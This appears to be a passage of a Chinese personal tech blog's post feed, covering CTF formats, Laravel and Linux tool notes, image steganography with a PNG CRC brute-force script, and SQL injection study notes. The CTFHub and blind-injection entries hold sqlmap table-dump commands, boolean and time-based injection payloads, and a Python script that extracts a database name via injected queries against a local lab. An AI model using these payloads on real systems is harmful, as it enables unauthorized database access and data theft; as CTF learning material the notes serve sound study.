href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html#exp">EXP编写</a></h2><p>上图中用到的EXP，就是根据之前介绍的fastcgi协议来编写的，代码如下：<a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a> 。兼容Python2和Python3，方便在内网用。</p><p>之前好些人总是拿着一个GO写的工具在用，又不太好用。实际上理解了fastcgi协议，再看看这个源码，就很简单了。</p><p>EXP编写我就不讲了，自己读代码吧。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfhub.md</title>
      <link href="/TechnicalExperience/Penetration/ctfhub.html"/>
      <url>/TechnicalExperience/Penetration/ctfhub.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>在ctfhub的一点一滴</p></blockquote><span id="more"></span><h2 id="Sql注入"><a href="#Sql注入" class="headerlink" title="Sql注入"></a>Sql注入</h2><h3 id="sqlmap的基础用法"><a href="#sqlmap的基础用法" class="headerlink" title="sqlmap的基础用法"></a>sqlmap的基础用法</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 列出表名</span></span><br><span class="line">python sqlmap.py -u http://challenge-09b258a06d2a3854.sandbox.ctfhub.com:10080/?id=1 --tables</span><br><span class="line"><span class="meta">#</span><span class="bash"> 列出列名</span></span><br><span class="line">python sqlmap.py -u http://challenge-09b258a06d2a3854.sandbox.ctfhub.com:10080/?id=1 -T flag --columns</span><br><span class="line"><span class="meta">#</span><span class="bash"> 查数据</span></span><br><span class="line">python sqlmap.py -u http://challenge-09b258a06d2a3854.sandbox.ctfhub.com:10080/?id=1 -T flag -C flag --dump</span><br></pre></td></tr></table></figure><blockquote><p>转载自 CTFHUB</p></blockquote><p>CTF竞赛模式具体分为以下几类：</p><h2 id="CTF-赛事"><a href="#CTF-赛事" class="headerlink" title="CTF 赛事"></a>CTF 赛事</h2><h3 id="理论知识"><a href="#理论知识" class="headerlink" title="理论知识"></a>理论知识</h3><p>理论题多见于国内比赛，通常为选择题。包含单选及多选，选手需要根据自己所学的相关理论知识进行作答。最终得出分数。理论部分通常多见于初赛或是初赛之前的海选</p><h3 id="Jeopardy-解题"><a href="#Jeopardy-解题" class="headerlink" title="Jeopardy-解题"></a>Jeopardy-解题</h3><p>参赛队伍可以通过互联网或者现场网络参与，参数队伍通过与在线环境交互或文件离线分析，解决网络安全技术挑战获取相应分值，类似于 ACM 编程竞赛、信息学奥林匹克赛，根据总分和时间来进行排名。 不同的是这个解题模式一般会设置 一血(First Blood) 、 二血(Second Blood) 、 三血(Third Blood) ，也即最先完成的前三支队伍会获得额外分值，所以这不仅是对首先解出题目的队伍的分值鼓励，也是一种团队能力的间接体现。 当然还有一种流行的计分规则是设置每道题目的初始分数后，根据该题的成功解答队伍数，来逐渐降低该题的分值，也就是说如果解答这道题的人数越多，那么这道题的分值就越低。最后会下降到一个保底分值后便不再下降。一般称之为<code>动态积分</code>题目类型主要包含 Web 网络攻防 、 RE 逆向工程 、 Pwn 二进制漏洞利用 、 Crypto 密码攻击以及 Misc 安全杂项 这五个类别，个别比赛会根据题目类型进行扩展。</p><h3 id="AwD-攻防模式"><a href="#AwD-攻防模式" class="headerlink" title="AwD-攻防模式"></a>AwD-攻防模式</h3><p><strong>A</strong>ttack <strong>w</strong>ith <strong>D</strong>efense(AwD)全称攻防模式，在攻防模式CTF赛制中，参赛队伍连接到同一个网络空间。主办方会预先为每个参赛队分配要防守的主机，该主机称之为<code>GameBox</code>，每个队伍之间的GameBox<code>配置及漏洞是完全一致</code>的，选手需要防护自己的GameBox不被攻击的同时挖掘漏洞并攻击对手服务来得分。在AwD中主办方会运行一个名为<code>Checker</code>的程序定时检测选手的GameBox的运行状态。若检测到状态不对则判定该GameBox宕机，按照规则扣除一定分数。攻防模式CTF赛制可以实时通过得分反映出比赛情况，最终也以得分直接分出胜负，是一种竞争激烈，具有很强观赏性和高度透明性的网络安全赛制。在这种赛制中，不仅仅是比参赛队员的智力和技术，也比体力（因为比赛一般都会持续24至48小时左右），同时也比团队之间的分工配合与合作。 AwD通常仅包含<code>Web</code>及<code>Pwn</code>两种类型的题目。每个队伍可能会分到多个GameBox，随着比赛的进行，最早的GameBox可能会下线，同时会上线新的GameBox。</p><h3 id="RHG-自动化-AI自动化"><a href="#RHG-自动化-AI自动化" class="headerlink" title="RHG-自动化[ AI自动化]"></a>RHG-自动化[ AI自动化]</h3><p><strong>R</strong>obo <strong>H</strong>acking <strong>G</strong>ame(RHG)该利用人工智能或是AI或是自动化攻击程序来全自动的挖掘并利用漏洞，考验选手对于<code>漏洞理解</code>以及<code>工程化</code>能力。比赛开始前(一般为1-4周左右)主办方会给出测试环境以及相关接口文档。选手需要编写自动化程序来请求接口获取题目相关信息，该类程序通常称之为<code>bot</code>，在程序中<code>全自动</code>访问并挖掘目标漏洞，完成利用漏洞攻击并获取flag的过程。获取到的flag也由程序自动化提交。RHG因为是由bot全自动进行工作，所以比赛开始即可视为结束。剩下的一切全看参赛选手编写的自动化bot的工作情况。 比赛过程中不允许选手对bot进行任何的操作(包括debug/patch等等)。选手仅能看到自己的bot完成了哪些题。目前的得分情况等等。</p><h3 id="RW-真实世界"><a href="#RW-真实世界" class="headerlink" title="RW-真实世界"></a>RW-真实世界</h3><p><strong>R</strong>eal <strong>W</strong>orld(RW) 首次于2018年<code>长亭科技</code>主办的RealWorldCTF中出现，该赛制着重考察选手在面对真实的环境下的漏洞挖掘与利用能力。通常RW模式出题也会围绕着能够应用于真实渗透攻击当中的漏洞，一般来说RW常见题型为VM/Docker逃逸、针对浏览器的攻击、针对IoT/Car等设备的攻击，Web类攻击等等 在RW赛制中会有一个<code>Show Time</code>，当选手认为自己已经可以完成题目时，选手可以在比赛平台上提交展示申请，由工作人员根据申请先后顺序进行展示排期。选手展示之前需要上台并连接相关网络，同时现场大屏会切换至目标的正常页面。选手确认连接并测试OK之后开始计时。一般情况下上台攻击的时间为<code>5分钟</code>，选手一旦完成攻击现场大屏幕会实时看到攻击的效果，此时裁判会根据效果是否符合题目要求来判定该题是否完成。如5在攻击时间内依然未能看到展示效果则认为本次攻击失败。现如今为了防止选手恶意排期。通常会有一个队伍总展示次数(例如在2019年数字经济云安全公测大赛中每个队伍只允许上台展示30次)，选手也需要尽可能保证上台之后攻击的成功率 举个例子。题目要求需要攻击位于比赛网络中的某个网站并将首页替换为包含队伍名称的页面。题目给出该网站的一些信息(源代码/数据库等等)，选手经过本地挖掘漏洞之后，提交展示申请，排期到了之后进行上台展示。注意，因为RW模式是以展示效果来作为题目是否完成的准则，所以在RW模式中并<code>不存在Flag</code>。</p><h3 id="KoH-抢占山头"><a href="#KoH-抢占山头" class="headerlink" title="KoH-抢占山头"></a>KoH-抢占山头</h3><p><strong>K</strong>ing <strong>o</strong>f <strong>H</strong>ill(KoH)是近些年新衍生的一种赛制。该赛制有点类似于AwD，但是又和AwD有些不一样。选手面对的是一个黑盒的目标，需要先挖掘漏洞并利用漏洞控制目标。将自己的队伍标识(<code>队伍名称</code>或是<code>Token</code>之类)写入到指定文件。随后在该主机上进行加固等操作防止其他队伍攻击，主办方会定期去检查标识文件，根据文件中的队伍标识来判定本回合分数给予哪个队伍。可以看出KoH也是一种对抗极为激烈的赛制，同时考察选手的渗透能力及防御加固能力。</p><h3 id="Mix-混合"><a href="#Mix-混合" class="headerlink" title="Mix[混合]"></a>Mix[混合]</h3><p>混合模式结合了以上多种模式，现如今单一的赛制已经无法满足比赛及选手的参赛需求，所以大部分比赛会同时以多个模式进行比赛。例如参赛队伍通过解题(Jeopardy)可以获取一些初始分数，然后通过攻防对抗(AwD)进行得分增减的零和游戏，最终以得分高低分出胜负。</p><h2 id="CTF-题目类型"><a href="#CTF-题目类型" class="headerlink" title="CTF 题目类型"></a>CTF 题目类型</h2><p>在CTF中主要包含以下5个大类的题目，有些比赛会根据自己的侧重点单独添加某个分类，例如<code>移动设备(Mobile)</code>, <code>电子取证(Forensics)</code>等，近年来也会出来混合类型的题目，例如在Web中存在一个二进制程序，需要选手先利用Web的漏洞获取到二进制程序，之后通过逆向或是Pwn等方式获得最终flag</p><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><p>Web类题目大部分情况下和网、Web、HTTP等相关技能有关。主要考察选手对于Web攻防的一些知识技巧。诸如<code>SQL注入</code>、<code>XSS</code>、<code>代码执行</code>、<code>代码审计</code>等等都是很常见的考点。一般情况下Web题目只会给出一个能够访问的URL。部分题目会给出附件</p><h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3><p>Pwn类题目重点考察选手对于<code>二进制漏洞的挖掘和利用</code>能力，其考点也通常在<code>堆栈溢出</code>、<code>格式化漏洞</code>、<code>UAF</code>、<code>Double Free</code>等常见二进制漏洞上。选手需要根据题目中给出的二进制可执行文件进行逆向分析，找出其中的漏洞并进行利用，编写对应的漏洞攻击脚本(<code>Exploit</code>)，进而对主办方给出的远程服务器进行攻击并获取flag通常来说Pwn类题目给出的远程服务器信息为<code>nc IP_ADDRESS PORT</code>，例如<code>nc 1.2.3.4 4567</code>这种形式，表示在<code>1.2.3.4</code>这个IP的<code>4567</code>端口上运行了该题目</p><h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><p>Re类题目考察选手<code>逆向工程</code>能力。题目会给出一个可执行二进制文件，有些时候也可能是Android的APK安装包。选手需要逆向给出的程序，分析其程序工作原理。最终根据程序行为等获得flag</p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><p>Crypto类题目考察选手对<code>密码学</code>相关知识的了解程度，诸如<code>RSA</code>、<code>AES</code>、<code>DES</code>等都是密码学题目的常客。有些时候也会给出一个加密脚本和密文，根据加密流程逆推出明文。</p><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><p>Misc意为杂项，即不包含在以上分类的题目都会放到这个分类。题目会给出一个附件。选手下载该附件进行分析，最终得出flag<br>常见的题型有图片隐写、视频隐写、文档隐写、流量分析、协议分析、游戏、IoT相关等等。五花八门，种类繁多。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Laravel笔记</title>
      <link href="/Programming/PHP/Laravel.html"/>
      <url>/Programming/PHP/Laravel.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>摘要</p></blockquote><span id="more"></span><h2 id="Artisan-Commands"><a href="#Artisan-Commands" class="headerlink" title="Artisan Commands"></a>Artisan Commands</h2><table><thead><tr><th align="left">command</th><th align="left">action</th></tr></thead><tbody><tr><td align="left"><code>php artisan make:controller &lt;ControllerName&gt;</code></td><td align="left">create new Controller</td></tr><tr><td align="left"><code>php artisan route:list</code></td><td align="left">show route list</td></tr></tbody></table><h2 id="在-LearnKu-学习-L01-所踩的坑"><a href="#在-LearnKu-学习-L01-所踩的坑" class="headerlink" title="在 LearnKu 学习 L01 所踩的坑"></a>在 LearnKu 学习 L01 所踩的坑</h2><blockquote><p>全程使用 Sail 虚拟环境学习, 注意 docker-compose.yml 和 .env 文件的变量</p></blockquote><ol><li>MySql 数据库报错1</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQLSTATE[HY000] [2002] Connection refused (SQL: select * from information_schema.tables where table_schema = laravel8 and table_name = migrations and table_type = &#x27;BASE TABLE&#x27;)</span><br></pre></td></tr></table></figure><p>解决方法：将 <code>.env</code> 下的 <code>DB_HOST</code> 改为 <code>mysql</code></p><ol start="2"><li><p>即使翻墙，Sail也会有概率构建失败，未找到原因</p></li><li><p><code>compact()</code> 可以将一组变量转换为数组，键为变量名</p></li><li><p>注意随时运行 <code>npm run watch-poll</code></p></li><li><p>使用 withInput() 后模板里 old(‘email’) 将能获取到上一次用户提交的内容</p></li><li><p><code>Str::str_plural()</code> 输出单词的复数</p></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux常用好软推荐</title>
      <link href="/TechnicalExperience/Linux/awesome-software.html"/>
      <url>/TechnicalExperience/Linux/awesome-software.html</url>
      
        <content type="html"><![CDATA[<blockquote><p> 记录我自己喜欢的linux软件，此文章长期更新</p></blockquote><span id="more"></span><h2 id="screenkey"><a href="#screenkey" class="headerlink" title="screenkey"></a>screenkey</h2><p>A screencast tool to display your keys inspired by Screenflick</p><h2 id="tmux"><a href="#tmux" class="headerlink" title="tmux"></a>tmux</h2><p>A terminal multiplexer</p><h2 id="Ipython"><a href="#Ipython" class="headerlink" title="Ipython"></a>Ipython</h2><p>Productive Interactive Computing</p><p>Installation method: pip</p><h2 id="Qv2ray"><a href="#Qv2ray" class="headerlink" title="Qv2ray"></a>Qv2ray</h2><p>Cross-platform V2ray Client written in Qt (Stable Release)</p><p>Installation method: yay</p><h2 id="bat"><a href="#bat" class="headerlink" title="bat"></a>bat</h2><p>Cat clone with syntax highlighting and git integration</p><h2 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h2><ul><li><strong>-d</strong>: diff</li><li><strong>-b</strong>: bin</li></ul><h2 id="fzf"><a href="#fzf" class="headerlink" title="fzf"></a><a href="https://github.com/junegunn/fzf#using-git">fzf</a></h2><p>非常好用的文件模糊搜索工具，支持vim</p><h2 id="gitg"><a href="#gitg" class="headerlink" title="gitg"></a>gitg</h2><p>简单的git图形化工具</p><h2 id="fd"><a href="#fd" class="headerlink" title="fd"></a><a href="https://github.com/sharkdp/fd">fd</a></h2><p>「 <em>fd</em>是一种简单ㄡ快速和用户友好的<a href="https://www.gnu.org/software/findutils/"><em>find</em></a>替代方案.」</p><h2 id="Commitizen"><a href="#Commitizen" class="headerlink" title="Commitizen"></a>Commitizen</h2><p><a href="https://github.com/commitizen/cz-cli">Commitizen</a>是一个撰写合格 Commit message 的工具。</p><p>install: <code>$ npm install -g commitizen</code></p><h2 id="rg"><a href="#rg" class="headerlink" title="rg"></a>rg</h2><p>code搜索工具，以行为单位，是grep的替代工具，速度更快</p><p>install: <code>pacman -S ripgrep</code></p><h2 id="ag"><a href="#ag" class="headerlink" title="ag"></a>ag</h2><p>code搜索工具，以行为单位，是grep的替代工具，速度更快</p><p>install: <code>pacman -S the_silver_searcher</code></p>]]></content>
      
      
      <categories>
          
          <category> 个人技术心得 </category>
          
          <category> Linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>隐写秘籍</title>
      <link href="/TechnicalExperience/Penetration/steganography.html"/>
      <url>/TechnicalExperience/Penetration/steganography.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>隐写术是将秘密数据隐藏在普通的、非秘密的文件或消息中以避免被发现的技术；然后再目的地提取秘密数据。隐写术的使用可以与加密相结合，作为隐藏或保护数据的额外步骤。隐写术这个词来源于希腊词steganos（意思是隐藏或覆盖）和希腊词graph（意思是写）。</p></blockquote><span id="more"></span><p>隐写术虽然是在CTF中听到的名字，但实际上已经不是第一次用了，曾经逛迹于各大论坛用过几次图种😅，表面是图，改成rar后缀解压就是torrent😆，emm其实我也只是听说而已…..ok，现在来了解一些常见的隐写方法，我将会以如何隐藏，如何解开为思路进行学习</p><h1 id="图片中的秘密"><a href="#图片中的秘密" class="headerlink" title="图片中的秘密"></a>图片中的秘密</h1><p>所需知识：</p><ul><li>基本图片格式(bmp，jpg/jfif，png，gif…)的文件格式</li></ul><p>工具：</p><ul><li>cat</li><li>vim</li><li>hexdump</li><li>binwalk</li><li>…</li></ul><h2 id="将数据插入图片末尾"><a href="#将数据插入图片末尾" class="headerlink" title="将数据插入图片末尾"></a>将数据插入图片末尾</h2><p><strong>jpg/jfif</strong> 只会识别到结束标识<strong>FFD9</strong>，<strong>png</strong> 则是*<em>49 45 4e 44 ae 42  60 82 *</em></p><p>利用该原理，可以将各种数据插入图片末尾，常见的有</p><ul><li>jpg/png+text</li><li>jpg/png+rar(rar不规定开头标识，通过更改后缀可直接在两个文件进行转换)</li><li>等等</li></ul><h3 id="字符隐写"><a href="#字符隐写" class="headerlink" title="字符隐写"></a>字符隐写</h3><p>制作：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;text&#x27;</span> &gt; test.jpg</span><br><span class="line"><span class="comment">## 或者使用vim编辑二进制</span></span><br><span class="line">vim -b file.name</span><br><span class="line"><span class="comment"># 指令ga可查看当前字符信息</span></span><br><span class="line"><span class="comment"># 指令:%!xxd进入16进制编辑模式(%表示所有行)</span></span><br><span class="line"><span class="comment"># 修改16进制后使用:%!xxd -r返回成二进制</span></span><br></pre></td></tr></table></figure><p>查看方法：使用能解析二进制的工具即可</p><h3 id="文件隐写"><a href="#文件隐写" class="headerlink" title="文件隐写"></a>文件隐写</h3><p>制作：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat test.png file &gt; test.png</span><br></pre></td></tr></table></figure><p>解析：binwalk能解析这类特殊文件里的特殊标识，<code>-e</code>选项就能分离这些文件</p><h2 id="LSB隐写"><a href="#LSB隐写" class="headerlink" title="LSB隐写"></a>LSB隐写</h2><p>最低有效位隐写，更改图片某个像素点的最低位为隐藏的消息位，可实现字符串隐写和小图隐写。因为是更改了图片的像素点，所以采用有损压缩的图片格式就会丢失隐写的信息(比如jpg..)</p><p>小图隐写的解析方式需要使用Stegsolve工具对每个通道值的8个plane值进行二值化</p><p>字符隐写需要使用编程语言或工具将每个图片的最低位收集起来转换成ASCII码</p><blockquote><p>P.S.：目前没有找到很好的进行LSB写入的工具，只能使用编程语言代替下了，<a href="https://blog.csdn.net/weixin_26737625/article/details/108515493">python</a></p></blockquote><h2 id="EXIF隐写"><a href="#EXIF隐写" class="headerlink" title="EXIF隐写"></a>EXIF隐写</h2><p>exif可以记录数码照片的属性信息和拍摄数据，在linux端使用<strong>exiftool</strong>查看和编辑</p><h2 id="GIF文件"><a href="#GIF文件" class="headerlink" title="GIF文件"></a>GIF文件</h2><p>gif支持多帧动画，可以将数据隐写在一个极短的帧里面</p><blockquote><p>Stegsolve支持将gif解帧（Analyse－Frame Brower）</p><p>P.S.：有一些题会将GIF头给删除，需要自己加上…最新的标准是89a，头为<code>GIF89a</code></p></blockquote><h2 id="图片宽高"><a href="#图片宽高" class="headerlink" title="图片宽高"></a>图片宽高</h2><p>修改png图片IHDR头中的高宽可以隐藏图片的一部分，IHDR后面的第一个字节是宽，第二个字节是高，后面还有crc校验码</p><p>利用crc校验码可以破解该图的原始宽高，例如下面一个python代码就是根据crc暴力破解原始宽高</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 代码来源https://www.jianshu.com/p/0b5d14657d2e</span></span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="comment">#读文件</span></span><br><span class="line">file = <span class="string">&#x27;2.png&#x27;</span> </span><br><span class="line">fr = <span class="built_in">open</span>(file,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">data = <span class="built_in">bytearray</span>(fr[<span class="number">12</span>:<span class="number">29</span>])</span><br><span class="line">crc32key = <span class="built_in">eval</span>(<span class="built_in">str</span>(fr[<span class="number">29</span>:<span class="number">33</span>]).replace(<span class="string">&#x27;\\x&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&quot;b&#x27;&quot;</span>,<span class="string">&#x27;0x&#x27;</span>).replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(crc32key)</span><br><span class="line">n = <span class="number">4095</span> <span class="comment">#理论上0xffffffff,但考虑到屏幕实际，0x0fff就差不多了</span></span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(n):<span class="comment">#高和宽一起爆破</span></span><br><span class="line">    width = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, w))<span class="comment">#q为8字节，i为4字节，h为2字节</span></span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        height = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, h))</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            data[x+<span class="number">4</span>] = width[x]</span><br><span class="line">            data[x+<span class="number">8</span>] = height[x]</span><br><span class="line">            <span class="comment">#print(data)</span></span><br><span class="line">        crc32result = zlib.crc32(data)</span><br><span class="line">        <span class="keyword">if</span> crc32result == crc32key:</span><br><span class="line">            <span class="built_in">print</span>(width,height)</span><br><span class="line">            <span class="comment">#写文件</span></span><br><span class="line">            newpic = <span class="built_in">bytearray</span>(fr)</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                newpic[x+<span class="number">16</span>] = width[x]</span><br><span class="line">                newpic[x+<span class="number">20</span>] = height[x]</span><br><span class="line">            fw = <span class="built_in">open</span>(file+<span class="string">&#x27;.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)<span class="comment">#保存副本</span></span><br><span class="line">            fw.write(newpic)</span><br><span class="line">            fw.close</span><br></pre></td></tr></table></figure><blockquote><p>P.S.：linux修改后无法读取图片(校验码不对)，虽然修改校验码可以显示，但这张图片的破解难度估计就有点大（靠猜？）；windows可以显示修改后的图片</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 个人技术心得 </category>
          
          <category> 渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sql盲注笔记</title>
      <link href="/TechnicalExperience/Penetration/sql-injection-blind.html"/>
      <url>/TechnicalExperience/Penetration/sql-injection-blind.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>什么是盲注？在sql注入点输入sql语句不回显任何数据，只返回了网页处理的结果（使用布尔盲注），甚至不返回结果（设置数据库查询时间，时间盲注）</p><p>盲注是非常繁琐的，需要不断的更改url进行判断，可以用BP的intruder模块配合或者编程（直到我发现了sqlmap）</p></blockquote><span id="more"></span><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>进行布尔盲注一定要分清楚报错的条件，比如有的是数据为空、语句报错时报错，有的只是语句报错时才报错。</p><h3 id="判断流程"><a href="#判断流程" class="headerlink" title="判断流程"></a>判断流程</h3><p><code>?id=1 and &#39;s&#39;=&#39;p&#39;</code> 如果报错错则可以使用 <code>and</code> 爆破</p><h3 id="爆破方法-payload"><a href="#爆破方法-payload" class="headerlink" title="爆破方法(payload)"></a>爆破方法(payload)</h3><ol><li><code>?id=1 and 构造出想要的数据 =/like 猜想的数据</code></li><li><code>?id = if(构造出想要的数据 =/like 猜想的数据, 1, (select table_name from information_schema.tables))</code></li></ol><blockquote><p>tips：<code>false</code> 的的输出必须是 1 column，否则语句报错</p></blockquote><h3 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h3><p>目前先使用python进行爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># _*_  coding:utf-8 _*_</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">session = requests.session()  <span class="comment"># 访问该网站的其他页面时使用一样的cookie, 保持会话</span></span><br><span class="line">url = <span class="string">&quot;http://localhost:10000/?id=&quot;</span></span><br><span class="line">success_flag = <span class="string">&#x27;&#x27;</span>  <span class="comment"># 查询正确页面标志</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">database_name</span>():</span></span><br><span class="line">    time_start = time.time()</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">while</span> flag:</span><br><span class="line">        pos = <span class="number">1</span></span><br><span class="line">        old_pos = <span class="number">0</span> <span class="comment"># 判断是否结束</span></span><br><span class="line">        <span class="keyword">for</span> asc_str <span class="keyword">in</span> <span class="built_in">list</span>(string.ascii_lowercase)+<span class="built_in">list</span>(<span class="string">&#x27;_&#x27;</span>):</span><br><span class="line">            payload1 = <span class="string">&quot;if(substr(database(),%d,1) = &#x27;%s&#x27;,1,(select table_name from information_schema.tables))&quot;</span> % (</span><br><span class="line">                pos, asc_str)</span><br><span class="line">            <span class="comment">#payload2 = &quot;1 and substr(database(),%d,1) = &#x27;%s&#x27;&quot; % (</span></span><br><span class="line">            <span class="comment">#    pos, asc_str)</span></span><br><span class="line">            result = requests.get(url+payload1)</span><br><span class="line">            <span class="keyword">if</span> success_flag <span class="keyword">in</span> result.text:</span><br><span class="line">                name += asc_str</span><br><span class="line">                old_pos = pos</span><br><span class="line">                pos += <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> old_pos+<span class="number">1</span> != pos:</span><br><span class="line">            flag = <span class="literal">False</span></span><br><span class="line">            time_end = time.time()</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Database name       : &#123;&#125;\nNumber of characters: &#123;&#125;\nTime cost           : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">                name, pos, time_end-time_start))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    database_name()</span><br></pre></td></tr></table></figure><p>从注入点得到当前数据库的表数</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static//img/article/2021/bool-blind.png" alt=""></p><p>使用BP暴出数据库的名字（一个字母一个字母的暴破）</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static//img/article/2021/bp-sql-blind.png" alt=""></p><p>爆破该数据库第一张表的名字(也是一个字母一个字母)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select table_name </span></span><br><span class="line"><span class="string">from information_schema.tables </span></span><br><span class="line"><span class="string">where table_schema = database() </span></span><br><span class="line"><span class="string">limit 0,1) </span></span><br><span class="line"><span class="string">like &#x27;</span>u<span class="operator">%</span><span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static//img/article/2021/bp-sql-blind2.png" alt=""></p><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>如果连网页处理结果都不给的话，还可以设置数据库查询时间进行盲注</p><p>比如下面这个页面，不管输入什么都显示一个样</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static//img/article/2021/sql-injection-blind-time.png" alt=""></p><p>利用时间注入，当sql语句运行成功时延时2s</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(</span></span><br><span class="line"><span class="string">left(database(),1)=&#x27;</span>x<span class="string">&#x27;, sleep(2), 0)</span></span><br><span class="line"><span 